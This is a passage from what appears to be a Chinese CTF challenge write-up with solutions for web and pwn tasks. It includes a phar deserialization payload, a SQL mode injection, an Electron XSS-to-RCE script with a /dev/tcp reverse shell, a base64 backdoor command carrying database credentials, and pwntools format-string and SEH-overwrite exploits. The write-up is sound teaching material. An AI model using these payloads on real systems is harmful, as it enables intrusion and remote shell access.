class="variable">$target</span>,<span class="string">&quot;user_agent&quot;</span>=&gt;<span class="string">&quot;zedd\r\nContent-Type: application/x-www-form-urlencoded\r\n&quot;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$headers</span>).<span class="string">&quot;\r\nContent-Length: &quot;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&quot;\r\n\r\n&quot;</span>.<span class="variable">$post_string</span>,<span class="string">&quot;uri&quot;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;1.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="comment">// &lt;?php __HALT_COMPILER();</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span> . <span class="string">&quot;&lt;script language=&#x27;php&#x27;&gt;__HALT_COMPILER();&lt;/script&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&quot;1.phar&quot;</span>, <span class="string">&quot;1.gif&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="easy-sql">easy_sql</span><a href="#easy-sql" class="header-anchor"></a></h3><p>题目打开之后，会提示让我们输入flag，如果输入的内容与flag一样的话，则输出flag。<br>通过输入的字符串可以大致判断出后端逻辑是:<br>$query||FLAG<br>因此需要找到一种可以通过||带出flag的方式。在sql_mode，可以通过将其值设置为PIPE_AS_CONCAT改变||的作用为拼接字符串，此时随便输入一串字符串便能返回该字符串与FLAG拼接的内容。<br>这里我借用N.E.X的一张图加以说明：<br><img src="https://hackmd.summershrimp.com/uploads/upload_798e53bdb308c936d6e7c008f3bc58ba.png"><br><img src="https://hackmd.summershrimp.com/uploads/upload_669e9245c3c4e870eca0ea89ccf2718a.png"></p>
<p>最终的payload为：<br>1;set sql_mode&#x3D;pipes_as_concat;select 1</p>
<p>由于出题出到一半时有事就放着了，最后放题时看有黑名单存在便以为出完了，结果导致了许多低级的非预期解。</p>
<h3><span id="icloudmusic">iCloudMusic</span><a href="#icloudmusic" class="header-anchor"></a></h3><p>第一步的XSS不难，js_to_run中直接将歌单信息拼接到js中，引号+大括号逃逸即可。</p>
<p>拿到XSS怎样转化为RCE则考察怎样通过覆盖js原生函数来泄漏preload.js运行的node环境中的一些变量&#x2F;函数等，这里有两种方法</p>
<ul>
<li>思路1 暴力重写js所有原生函数<br>以Function.prototype.apply为例</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">apply2</span>=<span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">apply</span>;</span><br><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">apply</span>=<span class="keyword">function</span>(<span class="params">...args</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> args)</span><br><span class="line">        <span class="keyword">if</span>(args[i])</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(args[i].<span class="title function_">toString</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">apply2</span>(...args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>view的devtools执行这个函数后，尝试执行request.get一个url，可以在console中找到<code>process</code>.因此便可以将我们的覆盖脚本改写为：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">apply2</span>=<span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">apply</span>;</span><br><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">apply</span>=<span class="keyword">function</span>(<span class="params">...args</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(args[<span class="number">0</span>]!=<span class="literal">null</span> &amp;&amp; args[<span class="number">0</span>]!=<span class="literal">undefined</span> &amp;&amp; args[<span class="number">0</span>].<span class="property">env</span>!=<span class="literal">undefined</span>)&#123;</span><br><span class="line">        <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">apply</span>=<span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">apply2</span>;</span><br><span class="line">        args[<span class="number">0</span>].<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/XXXXXX/8080 0&gt;&amp;1&quot;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">apply2</span>(...args)</span><br><span class="line">&#125;</span><br><span class="line">request.<span class="title function_">get</span>(<span class="string">&#x27;http://www.baidu.com/&#x27;</span>,<span class="literal">null</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>思路2 白盒审计</li>
</ul>
<p>request库&#x2F;http库&#x2F;其他很多node库都有可能调用process相关的函数，其中process下有这样一个函数<code>nextTick</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ƒ (...args) &#123;</span><br><span class="line">            process.<span class="title function_">activateUvLoop</span>();</span><br><span class="line">            <span class="keyword">return</span> func.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到process.nextTick中调用了func.apply,即Function.prototype.apply,且参数this正是<code>process</code>本身。<br>在http库中处理socket请求的一个关键函数即调用了这个函数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ClientRequest</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">onSocket</span> = <span class="keyword">function</span> <span class="title function_">onSocket</span>(<span class="params">socket</span>) &#123;</span><br><span class="line">  process.<span class="title function_">nextTick</span>(onSocketNT, <span class="variable language_">this</span>, socket);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>request库处理请求都使用http库，且request库本身也多次调用了这个函数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> defer = <span class="keyword">typeof</span> setImmediate === <span class="string">&#x27;undefined&#x27;</span></span><br><span class="line">  ? process.<span class="property">nextTick</span></span><br><span class="line">  : setImmediate</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>知道这一点我们便可以直接给出我们同上的利用脚本。</p>
<h3><span id="cocktail-s-remix">Cocktail’s Remix</span><a href="#cocktail-s-remix" class="header-anchor"></a></h3><p>1.从robots.txt可以得到根目录下页面。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /info.php</span><br><span class="line">Disallow: /download.php</span><br><span class="line">Disallow: /config.php</span><br></pre></td></tr></table></figure>
<p>2.从info.php页面可以发现Apache后门模块mod_cocktail。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">core mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_cocktail mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php7 mod_reqtimeout mod_setenvif mod_status</span><br></pre></td></tr></table></figure>
<p>3.通过download.php页面可以下载任意可读文件，包括mod_cocktail.so和config.php。<br>下载方式:<a href="http://ip/download.php?filename=%E6%96%87%E4%BB%B6%E5%90%8D">http://ip/download.php?filename=文件名</a><br>下载数据库配置页面config.php<br><a href="http://ip/download.php?filename=config.php">http://ip/download.php?filename=config.php</a><br>下载模块链接库mod_cocktail.so:<br><a href="http://ip/download.php?filename=/usr/lib/apache2/modules/mod_cocktail.so">http://ip/download.php?filename=/usr/lib/apache2/modules/mod_cocktail.so</a></p>
<p>4.下载config.php页面源码得到内网数据库地址，用户和密码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//$db_server = &quot;MysqlServer&quot;;</span></span><br><span class="line">	<span class="comment">//$db_username = &quot;dba&quot;;</span></span><br><span class="line">    <span class="comment">//$db_password = &quot;rNhHmmNkN3xu4MBYhm&quot;;	</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>5.对mod_cocktail.so进行逆向，掌握后门利用方法。</p>
<p>对收到的HTTP请求头“Reffer”字段进行base64解码，并执行命令。</p>
<p>6.通过apache后门访问内网数据库获取flag值。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">curl <span class="string">&#x27;http://127.0.0.1/1&#x27;</span> -H <span class="string">&#x27;Reffer: bXlzcWwgLWggTXlzcWxTZXJ2ZXIgLXUgZGJhIC1wck5oSG1tTmtOM3h1NE1CWWhtIC1lICdzZWxlY3QgKiBmcm9tICBmbGFnLmZsYWc7Jw==&#x27;</span></span><br><span class="line"><span class="comment">#Base64解码内容:mysql -h MysqlServer -u dba -prNhHmmNkN3xu4MBYhm -e &#x27;select * from  flag.flag;&#x27;</span></span><br></pre></td></tr></table></figure>


<h2><span id="pwn">Pwn</span><a href="#pwn" class="header-anchor"></a></h2><h3><span id="playfmt">playfmt</span><a href="#playfmt" class="header-anchor"></a></h3><p>一开始用C++泄露flag，子类继承于派生类，析构函数未写成虚析构</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">base</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">char</span>* str;</span><br><span class="line">	<span class="built_in">base</span>() &#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;str = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">		<span class="built_in">memcpy</span>(<span class="keyword">this</span>-&gt;str, <span class="string">&quot;hello,world&quot;</span>, <span class="number">32</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	~<span class="built_in">base</span>() &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="keyword">this</span>-&gt;str);</span><br><span class="line">		<span class="built_in">free</span>(<span class="keyword">this</span>-&gt;str);</span><br><span class="line">		<span class="keyword">this</span>-&gt;str = <span class="literal">nullptr</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">derived</span> :<span class="keyword">public</span> base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">char</span>* flag;</span><br><span class="line">	<span class="built_in">derived</span>() &#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;flag = <span class="literal">nullptr</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">derived</span>(<span class="type">char</span>* s) &#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;flag = s;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	~<span class="built_in">derived</span>() &#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;flag = <span class="literal">nullptr</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;Testing my C++ skills...&quot;</span>);</span><br><span class="line"><span class="comment">//安全操作</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;testing 1...&quot;</span>);</span><br><span class="line">derived* nothing = <span class="keyword">new</span> <span class="built_in">derived</span>(<span class="literal">nullptr</span>);</span><br><span class="line"><span class="keyword">delete</span> nothing;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;testing 2...&quot;</span>);</span><br><span class="line">derived* nothing2 = <span class="keyword">new</span> <span class="built_in">derived</span>();</span><br><span class="line"><span class="keyword">delete</span> nothing2;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;testing 3...&quot;</span>);</span><br><span class="line"><span class="comment">//漏洞点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//带参构造函数，this-&gt;flag = (global)flag</span></span><br><span class="line">derived* ptr = <span class="keyword">new</span> <span class="built_in">derived</span>(flag);</span><br><span class="line">base* ptr2 = (base*)ptr;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;You think I will leave the flag?&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>然后的printf……比较常规吧<br>其实是因为这个题在三月份的时候就出来了，后来de1ctf里charlie大哥出的unprintable出的比较好，然后printf就被玩烂了…</p>
<p>附exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">do_fmt_ebp_offset = <span class="number">6</span></span><br><span class="line">play_ebp_offset = <span class="number">14</span></span><br><span class="line">main_ebp_offset = <span class="number">26</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">format_offset</span>(<span class="params">format_str , offset</span>):</span><br><span class="line">	<span class="keyword">return</span> format_str.replace(<span class="string">&quot;&#123;&#125;&quot;</span> , <span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_target_offset_value</span>(<span class="params">offset , name</span>):</span><br><span class="line">	payload = format_offset(<span class="string">&quot;%&#123;&#125;$p\x00&quot;</span> , offset)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	text = p.recv()</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		value = <span class="built_in">int</span>(text.split(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>] , <span class="number">16</span>)</span><br><span class="line">	  	<span class="built_in">print</span>(name + <span class="string">&quot; : &quot;</span> + <span class="built_in">hex</span>(value))</span><br><span class="line">		<span class="keyword">return</span> value</span><br><span class="line">	<span class="keyword">except</span> Exception, e:</span><br><span class="line">		<span class="built_in">print</span> text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify_last_byte</span>(<span class="params">last_byte , offset</span>):</span><br><span class="line">	payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(last_byte) + <span class="string">&quot;c&quot;</span> + format_offset(<span class="string">&quot;%&#123;&#125;$hhn&quot;</span> , offset)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">addr , value , ebp_offset , ebp_1_offset</span>):</span><br><span class="line">	addr_last_byte = addr &amp; <span class="number">0xff</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">		now_value = (value &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">		modify_last_byte(addr_last_byte + i ,  ebp_offset)</span><br><span class="line">		modify_last_byte(now_value , ebp_1_offset)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./playfmt&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./playfmt&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;=\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;=\n&quot;</span>)</span><br><span class="line"><span class="comment"># leak ebp_1_addr then get ebp_addr</span></span><br><span class="line">play_ebp_addr = get_target_offset_value(do_fmt_ebp_offset,  <span class="string">&quot;logo_ebp&quot;</span>) </span><br><span class="line"><span class="comment"># get_ebp_addr</span></span><br><span class="line">main_ebp_addr = get_target_offset_value(do_fmt_ebp_offset,  <span class="string">&quot;main_ebp&quot;</span>)</span><br><span class="line"><span class="comment"># flag_class_ptr_addr = main_ebp_addr + 0x10</span></span><br><span class="line"><span class="comment"># flag_class_ptr_offset = main_ebp_offset - 4</span></span><br><span class="line">flag_class_ptr_offset = <span class="number">19</span></span><br><span class="line">flag_addr = get_target_offset_value(flag_class_ptr_offset , <span class="string">&quot;flag_addr&quot;</span>) - <span class="number">0x420</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(flag_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># puts_plt = elf.plt[&quot;puts&quot;]</span></span><br><span class="line">modify(main_ebp_addr + <span class="number">4</span> , flag_addr , do_fmt_ebp_offset , play_ebp_offset)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = format_offset(<span class="string">&quot;%&#123;&#125;$s\x00&quot;</span> , play_ebp_offset + <span class="number">1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment"># log.info(&quot;flag_addr : &quot; + hex(flag_addr))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.sendline(&quot;quit&quot;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3><span id="babystack">BabyStack</span><a href="#babystack" class="header-anchor"></a></h3><p>通过除0异常进入正确流程后，利用栈溢出覆盖SEH，并在栈上伪造scope_table，从而bypass SafeSEH，控制程序执行流，获取flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p32</span>(<span class="params">addr</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;I&quot;</span>,addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s,addr</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_addr</span>(<span class="params">addr</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Do you want to know more?\r\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;value is &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = Process(&quot;./BabyStack.exe&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;121.40.159.66&quot;</span>,<span class="number">6666</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;192.168.50.165&quot;,6666) </span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello,I will give you some gifts\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;stack address = &quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\r\n&quot;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;stack_addr&quot;</span>,stack_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;main address = &quot;</span>)</span><br><span class="line">main_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\r\n&quot;</span>)[:-<span class="number">2</span>],<span class="number">16</span>) + <span class="number">0x4a82</span></span><br><span class="line">lg(<span class="string">&quot;main_addr&quot;</span>,main_addr)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="built_in">hex</span>(main_addr + <span class="number">0x171</span>)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&quot;0&quot;</span>).upper())</span><br><span class="line"></span><br><span class="line">search_addr(main_addr + <span class="number">0x73c24</span>)</span><br><span class="line">security_cookie = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\r\n&quot;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;security_cookie&quot;</span>,security_cookie)</span><br><span class="line"></span><br><span class="line"><span class="comment"># stack_addr--&gt;0xd8fbf0</span></span><br><span class="line"><span class="comment"># 00D8FB24  buffer_start</span></span><br><span class="line"><span class="comment"># 00D8FBB4  GS_cookie</span></span><br><span class="line"><span class="comment"># 00D8FBB8  addr1</span></span><br><span class="line"><span class="comment"># 00D8FBBC  start</span></span><br><span class="line"><span class="comment"># 00D8FBC0  next_SEH</span></span><br><span class="line"><span class="comment"># 00D8FBC4  this_SEH_ptr</span></span><br><span class="line"><span class="comment"># 00D8FBC8  scope_table</span></span><br><span class="line"></span><br><span class="line">search_addr(stack_addr - (<span class="number">0xd8fbf0</span> - <span class="number">0x0D8FBC0</span>))</span><br><span class="line">next_SEH = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\r\n&quot;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;next_SEH&quot;</span>,next_SEH)</span><br><span class="line"></span><br><span class="line">search_addr(stack_addr - (<span class="number">0xd8fbf0</span> - <span class="number">0x0D8FBC4</span>))</span><br><span class="line">this_SEH_ptr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\r\n&quot;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;this_SEH_ptr&quot;</span>,this_SEH_ptr)</span><br><span class="line"></span><br><span class="line">search_addr(stack_addr - (<span class="number">0xd8fbf0</span> - <span class="number">0x0D8FBC8</span>))</span><br><span class="line">Scope_Table = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\r\n&quot;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;Scope_Table&quot;</span>,Scope_Table)</span><br><span class="line"></span><br><span class="line">search_addr(stack_addr - (<span class="number">0xd8fbf0</span> - <span class="number">0x0D8FBB4</span>))</span><br><span class="line">GS_cookie = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\r\n&quot;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;GS_cookie&quot;</span>,GS_cookie)</span><br><span class="line"></span><br><span class="line">search_addr(stack_addr - (<span class="number">0xd8fbf0</span> - <span class="number">0x0D8FBBC</span>))</span><br><span class="line">start = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\r\n&quot;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;start&quot;</span>,start)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Do you want to know more?\r\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;homura&quot;</span>)</span><br><span class="line"></span><br><span class="line">buffer_start = stack_addr - (<span 